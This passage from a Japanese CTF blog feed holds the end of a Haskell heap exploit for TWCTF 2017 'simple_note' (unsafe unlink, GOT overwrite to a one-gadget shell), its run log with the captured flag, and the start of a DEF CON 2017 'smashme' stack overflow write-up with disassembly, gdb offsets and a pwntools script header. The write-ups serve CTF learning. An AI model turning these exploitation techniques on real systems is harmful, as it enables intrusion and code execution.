<span id="cb6-43"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-43" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Your choice: \n&quot;</span></span>
<span id="cb6-44"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-44" aria-hidden="true" tabindex="-1"></a>        sendline r <span class="st">&quot;2&quot;</span></span>
<span id="cb6-45"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-45" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Please input the index: \n&quot;</span></span>
<span id="cb6-46"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-46" aria-hidden="true" tabindex="-1"></a>        sendline r <span class="op">$</span> showByteString idx</span>
<span id="cb6-47"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-47" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-48"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-48" aria-hidden="true" tabindex="-1"></a>      showNote idx <span class="ot">=</span> <span class="kw">do</span></span>
<span id="cb6-49"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-49" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Your choice: \n&quot;</span></span>
<span id="cb6-50"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-50" aria-hidden="true" tabindex="-1"></a>        sendline r <span class="st">&quot;3&quot;</span></span>
<span id="cb6-51"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-51" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Please input the index: \n&quot;</span></span>
<span id="cb6-52"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-52" aria-hidden="true" tabindex="-1"></a>        sendline r <span class="op">$</span> showByteString idx</span>
<span id="cb6-53"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-53" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Note: \n&quot;</span></span>
<span id="cb6-54"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-54" aria-hidden="true" tabindex="-1"></a>        buf <span class="ot">&lt;-</span> recvuntil r <span class="st">&quot;\n====&quot;</span></span>
<span id="cb6-55"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-55" aria-hidden="true" tabindex="-1"></a>        <span class="fu">return</span> <span class="op">$</span> BS.take (BS.length buf <span class="op">-</span> BS.length <span class="st">&quot;\n====&quot;</span>) buf</span>
<span id="cb6-56"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-56" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-57"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-57" aria-hidden="true" tabindex="-1"></a>      editNote idx str <span class="ot">=</span> <span class="kw">do</span></span>
<span id="cb6-58"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-58" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Your choice: \n&quot;</span></span>
<span id="cb6-59"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-59" aria-hidden="true" tabindex="-1"></a>        sendline r <span class="st">&quot;4&quot;</span></span>
<span id="cb6-60"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-60" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Please input the index: \n&quot;</span></span>
<span id="cb6-61"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-61" aria-hidden="true" tabindex="-1"></a>        sendline r <span class="op">$</span> showByteString idx</span>
<span id="cb6-62"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-62" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Please input your note: \n&quot;</span></span>
<span id="cb6-63"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-63" aria-hidden="true" tabindex="-1"></a>        send r str</span>
<span id="cb6-64"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-64" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-65"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-65" aria-hidden="true" tabindex="-1"></a>      exit <span class="ot">=</span> <span class="kw">do</span></span>
<span id="cb6-66"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-66" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Your choice: \n&quot;</span></span>
<span id="cb6-67"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-67" aria-hidden="true" tabindex="-1"></a>        sendline r <span class="st">&quot;5&quot;</span></span>
<span id="cb6-68"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-68" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-69"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-69" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;allocate 0x88 bytes buffer x4 (buffer 0..3)&quot;</span></span>
<span id="cb6-70"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-70" aria-hidden="true" tabindex="-1"></a>  replicateM_ <span class="dv">4</span> <span class="op">$</span> addNote <span class="bn">0x88</span> <span class="op">$</span> BS.replicate <span class="bn">0x88</span> <span class="ch">'A'</span></span>
<span id="cb6-71"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-71" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-72"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-72" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;free buffer 2 and buffer 0&quot;</span></span>
<span id="cb6-73"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-73" aria-hidden="true" tabindex="-1"></a>  <span class="fu">mapM_</span> deleteNote [<span class="dv">2</span>, <span class="dv">0</span>]</span>
<span id="cb6-74"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-74" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-75"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-75" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;allocate 0x88 bytes buffer x2 (buffer 0, buffer 2)&quot;</span></span>
<span id="cb6-76"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-76" aria-hidden="true" tabindex="-1"></a>  addNote <span class="bn">0x88</span> <span class="op">$</span> BS.replicate <span class="dv">9</span> <span class="ch">'a'</span></span>
<span id="cb6-77"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-77" aria-hidden="true" tabindex="-1"></a>  addNote <span class="bn">0x88</span> <span class="op">$</span> BS.replicate <span class="dv">8</span> <span class="ch">'b'</span></span>
<span id="cb6-78"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-78" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-79"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-79" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;leak informations&quot;</span></span>
<span id="cb6-80"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-80" aria-hidden="true" tabindex="-1"></a>  leak1 <span class="ot">&lt;-</span> BS.drop <span class="dv">8</span> <span class="op">&lt;$&gt;</span> showNote <span class="dv">0</span></span>
<span id="cb6-81"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-81" aria-hidden="true" tabindex="-1"></a>  leak2 <span class="ot">&lt;-</span> BS.drop <span class="dv">8</span> <span class="op">&lt;$&gt;</span> showNote <span class="dv">2</span></span>
<span id="cb6-82"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-82" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> <span class="dt">Just</span> heap_base'     <span class="ot">=</span> u64 <span class="op">$</span> leak1 <span class="op">&lt;&gt;</span> BS.replicate (<span class="dv">8</span> <span class="op">-</span> BS.length leak1) <span class="ch">'\x00'</span></span>
<span id="cb6-83"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-83" aria-hidden="true" tabindex="-1"></a>      <span class="dt">Just</span> main_arena_top <span class="ot">=</span> u64 <span class="op">$</span> leak2 <span class="op">&lt;&gt;</span> BS.replicate (<span class="dv">8</span> <span class="op">-</span> BS.length leak2) <span class="ch">'\x00'</span></span>
<span id="cb6-84"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-84" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-85"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-85" aria-hidden="true" tabindex="-1"></a>      heap_base   <span class="ot">=</span> heap_base' <span class="op">.&amp;.</span> complement <span class="bn">0xff</span></span>
<span id="cb6-86"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-86" aria-hidden="true" tabindex="-1"></a>      main_arena  <span class="ot">=</span> main_arena_top <span class="op">-</span> <span class="bn">0x58</span></span>
<span id="cb6-87"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-87" aria-hidden="true" tabindex="-1"></a>      libc_base   <span class="ot">=</span> main_arena <span class="op">-</span> libc_main_arena'</span>
<span id="cb6-88"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-88" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-89"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-89" aria-hidden="true" tabindex="-1"></a>  success <span class="op">$</span> <span class="st">&quot;  heap_base:  0x&quot;</span> <span class="op">&lt;&gt;</span> showHex heap_base <span class="st">&quot;&quot;</span></span>
<span id="cb6-90"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-90" aria-hidden="true" tabindex="-1"></a>  success <span class="op">$</span> <span class="st">&quot;  main_arena: 0x&quot;</span> <span class="op">&lt;&gt;</span> showHex main_arena <span class="st">&quot;&quot;</span></span>
<span id="cb6-91"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-91" aria-hidden="true" tabindex="-1"></a>  success <span class="op">$</span> <span class="st">&quot;  libc_base:  0x&quot;</span> <span class="op">&lt;&gt;</span> showHex libc_base <span class="st">&quot;&quot;</span></span>
<span id="cb6-92"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-92" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-93"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-93" aria-hidden="true" tabindex="-1"></a>  <span class="co">-------------------------------------------------------------------</span></span>
<span id="cb6-94"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-94" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-95"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-95" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;allocate [0x88, 0xf8, 0x88, 0x88] bytes buffer (buffer 4..7)&quot;</span></span>
<span id="cb6-96"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-96" aria-hidden="true" tabindex="-1"></a>  forM_ [<span class="bn">0x88</span>, <span class="bn">0xf8</span>, <span class="bn">0x88</span>, <span class="bn">0x88</span>] <span class="op">$</span> \size <span class="ot">-&gt;</span> addNote size <span class="op">$</span> BS.replicate size <span class="ch">'A'</span></span>
<span id="cb6-97"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-97" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-98"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-98" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;free buffer 5&quot;</span></span>
<span id="cb6-99"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-99" aria-hidden="true" tabindex="-1"></a>  deleteNote <span class="dv">5</span></span>
<span id="cb6-100"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-100" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-101"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-101" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;overwrite chunk 5's size&quot;</span></span>
<span id="cb6-102"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-102" aria-hidden="true" tabindex="-1"></a>  editNote <span class="dv">4</span> <span class="op">$</span> BS.replicate <span class="bn">0x88</span> <span class="ch">'c'</span> <span class="op">&lt;&gt;</span> <span class="st">&quot;\xf1&quot;</span></span>
<span id="cb6-103"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-103" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-104"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-104" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;write fake prev_size via buffer 7&quot;</span></span>
<span id="cb6-105"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-105" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> buf <span class="ot">=</span> BS.concat <span class="op">$</span> catMaybes</span>
<span id="cb6-106"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-106" aria-hidden="true" tabindex="-1"></a>            [ <span class="dt">Just</span> <span class="op">$</span> BS.replicate <span class="bn">0x50</span> <span class="ch">'d'</span></span>
<span id="cb6-107"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-107" aria-hidden="true" tabindex="-1"></a>            , p64 <span class="bn">0x1f0</span></span>
<span id="cb6-108"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-108" aria-hidden="true" tabindex="-1"></a>            ]</span>
<span id="cb6-109"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-109" aria-hidden="true" tabindex="-1"></a>  editNote <span class="dv">7</span> buf</span>
<span id="cb6-110"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-110" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-111"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-111" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;allocate [0x108, 0x88] bytes buffer (buffer 5, buffer 8)&quot;</span></span>
<span id="cb6-112"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-112" aria-hidden="true" tabindex="-1"></a>  forM_ [<span class="bn">0x108</span>, <span class="bn">0x88</span>] <span class="op">$</span> \size <span class="ot">-&gt;</span> addNote size <span class="op">$</span> BS.replicate size <span class="ch">'A'</span></span>
<span id="cb6-113"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-113" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-114"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-114" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;set chunk 8's fd and bk, clear prev_inuse flag&quot;</span></span>
<span id="cb6-115"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-115" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> buf <span class="ot">=</span> BS.concat <span class="op">$</span> catMaybes</span>
<span id="cb6-116"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-116" aria-hidden="true" tabindex="-1"></a>            [ p64 <span class="op">$</span> list <span class="op">+</span> <span class="bn">0x18</span>   <span class="co">-- fd</span></span>
<span id="cb6-117"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-117" aria-hidden="true" tabindex="-1"></a>            , p64 <span class="op">$</span> list <span class="op">+</span> <span class="bn">0x20</span>   <span class="co">-- bk</span></span>
<span id="cb6-118"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-118" aria-hidden="true" tabindex="-1"></a>            , <span class="dt">Just</span> <span class="op">$</span> BS.replicate <span class="bn">0x70</span> <span class="ch">'d'</span></span>
<span id="cb6-119"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-119" aria-hidden="true" tabindex="-1"></a>            , p64 <span class="bn">0x90</span>            <span class="co">-- prev_size</span></span>
<span id="cb6-120"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-120" aria-hidden="true" tabindex="-1"></a>            , <span class="dt">Just</span> <span class="st">&quot;\x50&quot;</span>         <span class="co">-- size</span></span>
<span id="cb6-121"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-121" aria-hidden="true" tabindex="-1"></a>            ]</span>
<span id="cb6-122"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-122" aria-hidden="true" tabindex="-1"></a>  editNote <span class="dv">8</span> buf</span>
<span id="cb6-123"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-123" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-124"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-124" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;free buffer 5 (unsafe unlink attack!)&quot;</span></span>
<span id="cb6-125"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-125" aria-hidden="true" tabindex="-1"></a>  deleteNote <span class="dv">5</span></span>
<span id="cb6-126"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-126" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-127"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-127" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- 1: x/16xg 0x006020c0</span></span>
<span id="cb6-128"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-128" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- 0x6020c0 &lt;list&gt;:        0x0000000000b83130      0x0000000000b830a0</span></span>
<span id="cb6-129"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-129" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- 0x6020d0 &lt;list+16&gt;:     0x0000000000b83010      0x0000000000b831c0</span></span>
<span id="cb6-130"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-130" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- 0x6020e0 &lt;list+32&gt;:     0x0000000000b83250      0x0000000000000000</span></span>
<span id="cb6-131"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-131" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- 0x6020f0 &lt;list+48&gt;:     0x00000000006020d8      0x0000000000b833f0</span></span>
<span id="cb6-132"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-132" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- 0x602100 &lt;list+64&gt;:     0x0000000000000000      0x0000000000000000</span></span>
<span id="cb6-133"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-133" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- 0x602110 &lt;list+80&gt;:     0x0000000000000000      0x0000000000000000</span></span>
<span id="cb6-134"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-134" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- 0x602120 &lt;list+96&gt;:     0x0000000000000000      0x0000000000000000</span></span>
<span id="cb6-135"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-135" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- 0x602130 &lt;list+112&gt;:    0x0000000000000000      0x0000000000000000</span></span>
<span id="cb6-136"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-136" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-137"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-137" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;overwrite list[3] to puts@got via buffer 6&quot;</span></span>
<span id="cb6-138"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-138" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> heap_addr_len <span class="ot">=</span> BS.length leak1</span>
<span id="cb6-139"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-139" aria-hidden="true" tabindex="-1"></a>      libc_addr_len <span class="ot">=</span> BS.length leak2</span>
<span id="cb6-140"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-140" aria-hidden="true" tabindex="-1"></a>  editNote <span class="dv">6</span> <span class="op">$</span> BS.take heap_addr_len <span class="op">$</span> fromJust <span class="op">$</span> p64 puts_got</span>
<span id="cb6-141"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-141" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-142"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-142" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;overwrite puts@got to one-gadget-RCE via buffer 3&quot;</span></span>
<span id="cb6-143"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-143" aria-hidden="true" tabindex="-1"></a>  editNote <span class="dv">3</span> <span class="op">$</span> BS.take libc_addr_len <span class="op">$</span> fromJust <span class="op">$</span> p64 <span class="op">$</span> libc_base <span class="op">+</span> libc_one_gadget'</span>
<span id="cb6-144"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-144" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-145"><a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#cb6-145" aria-hidden="true" tabindex="-1"></a>  interactive r</span></code></pre></div>
<pre><code>$ ./exploit.hs
[x] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 16317
[+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 16317: Done
[*] allocate 0x88 bytes buffer x4 (buffer 0..3)
[*] free buffer 2 and buffer 0
[*] allocate 0x88 bytes buffer x2 (buffer 0, buffer 2)
[*] leak informations
[+]   heap_base:  0x1181000
[+]   main_arena: 0x7fd044fcfb20
[+]   libc_base:  0x7fd044c0b000
[*] allocate [0x88, 0xf8, 0x88, 0x88] bytes buffer (buffer 4..7)
[*] free buffer 5
[*] overwrite chunk 5's size
[*] write fake prev_size via buffer 7
[*] allocate [0x108, 0x88] bytes buffer (buffer 5, buffer 8)
[*] set chunk 8's fd and bk, clear prev_inuse flag
[*] free buffer 5 (unsafe unlink attack!)
[*] overwrite list[3] to puts@got via buffer 6
[*] overwrite puts@got to one-gadget-RCE via buffer 3
[*] Entering interactive mode
id
uid=16317069 gid=16317(p16317) groups=16317(p16317)
ls
flag
launch.sh
simple_note
cat flag
TWCTF{unl1nk_4774ck_15_u53fu1_73chn1qu3}
[*] Leaving interactive mode</code></pre>
<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>値は x86-64 の場合<a href="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>]]></summary>
</entry>
<entry>
    <title>DEF CON CTF 2017 Qualifier writeup</title>
    <link href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/index.html" />
    <id>https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/index.html</id>
    <published>2017-05-01T16:32:00Z</published>
    <updated>2017-05-01T16:32:00Z</updated>
    <summary type="html"><![CDATA[<p><a href="https://ctftime.org/event/459">DEF CON CTF 2017 Qualifier</a> に一人チーム <a href="https://ctftime.org/team/32588">poepoe</a> で参加. 144 points で 117 位.</p>
<p>Baby’s First の問題しか解けなかったけど, pwn するの久しぶりだったので楽しかった.<br />
それ以外の問題も点を入れていけるようにしていくぞ💪.</p>
<!--more-->
<h2 id="smashme">smashme</h2>
<p>x86-64 の ELF.</p>
<pre><code>$ file smashme
smashme: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=29c2093a0eca94730cd7fd861519602b3272a4f7, not stripped, with debug_info

$ checksec --file smashme
[*] '/tmp/smashme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)</code></pre>
<p>radare2 でディスアセンブルするとこんな感じ.<br />
超キケンな <code>gets</code> で stack に文字列を読み込んでいるため stack buffer overflow が起こせるのがわかる. ただし, その後に呼ばれる <code>sub.ifunc_4253b0_320</code> が非ゼロの値を返さないと <code>exit</code> が呼ばれてしまうので, 任意のアドレスに飛ばすには入力する文字列に細工が必要なようだ.</p>
<pre><code>|           0x004009d6      488d45c0       lea rax, qword [rbp - local_40h]
|           0x004009da      4889c7         mov rdi, rax
|           0x004009dd      b800000000     mov eax, 0
|           0x004009e2      e8e9f00000     call sym.gets              ; char*gets(char *s)
|           0x004009e7      488d45c0       lea rax, qword [rbp - local_40h]
|           0x004009eb      bed8064a00     mov esi, str.Smash_me_outside__how_bout_dAAAAAAAAAAA ; &quot;Smash me outside, how bout dAAAAAAAAAAA&quot; @ 0x4a06d8
|           0x004009f0      4889c7         mov rdi, rax
|           0x004009f3      e828f9ffff     call sub.ifunc_4253b0_320
|           0x004009f8      4885c0         test rax, rax
|       ,=&lt; 0x004009fb      7407           je 0x400a04
|       |   0x004009fd      b800000000     mov eax, 0
|      ,==&lt; 0x00400a02      eb0a           jmp 0x400a0e
|      ||      ; JMP XREF from 0x004009fb (sym.main)
|      |`-&gt; 0x00400a04      bf00000000     mov edi, 0
|      |    0x00400a09      e822e00000     call sym.exit              ; void exit(int status)
|      |       ; JMP XREF from 0x00400a02 (sym.main)
|      `--&gt; 0x00400a0e      c9             leave
\           0x00400a0f      c3             ret</code></pre>
<p>この <code>sub.ifunc_4253b0_320</code> がよくわからない<a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>ので gdb で処理を追ってみたところ, <a href="http://en.cppreference.com/w/c/string/byte/strstr"><code>strstr</code></a> に飛ぶことがわかった. <code>strstr</code> は第1引数に渡した文字列に第2引数引数に渡した文字列が含まれていたらその先頭文字のアドレスを, そうでなければ <code>NULL</code> を返す関数らしい. ということは, <code>call</code> される直前で <code>rsi</code> (第2引数) に設定されている <code>"Smash me outside, how bout dAAAAAAAAAAA"</code> で始まる文字列を入力すればよさそう.</p>
<p>gdb-peda の <code>pattc</code>, <code>patto</code> コマンドを使って調べると, 入力した文字列とリターンアドレスとののオフセットは↑の文字列+33文字なのがわかった.</p>
<pre><code>gdb-peda$ c
Continuing.
Welcome to the Dr. Phil Show. Wanna smash?
Smash me outside, how bout dAAAAAAAAAAAAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA

...

Stopped reason: SIGSEGV
0x0000000000400a0f in main ()
gdb-peda$ x/gx $rsp
0x7fffffffdf48:	0x4161414145414129
gdb-peda$ patto 0x4161414145414129
4711118433796833577 found at offset: 33</code></pre>
<p>そこで, その文字列のうしろに <code>0x0044611d: push rsp ; ret  ;  (2 found)</code> と shellcode をくっつけてみたところシェルを取ることができた. 作成したスクリプトと実行結果は次の通り.</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python2</span></span>
<span id="cb4-2"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-3"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="co"># DEF CON 2017 Quals : smashme</span></span>
<span id="cb4-4"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-5"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
<span id="cb4-6"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> sys</span>
<span id="cb4-7"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-7" aria-hidden="true" tabindex="-1"></a></span>
